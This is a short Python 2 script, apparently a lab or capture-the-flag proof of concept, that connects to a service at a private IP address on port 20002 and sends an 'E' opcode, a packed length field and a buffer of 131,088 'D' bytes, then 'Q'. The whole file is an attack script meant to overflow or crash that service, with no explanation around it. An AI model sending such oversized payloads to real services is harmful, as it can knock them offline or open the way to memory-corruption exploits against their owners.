from socket import *
import struct

s = socket(AF_INET, SOCK_STREAM)
s.connect(("192.168.12.131", 20002))

offset = 131072 + 16
payload = b"D"*offset
op = b"E"
size = struct.pack("<i", len(payload))
print "Sending payload" 
s.send(op + size + payload)
s.send(b"Q")
s.close()
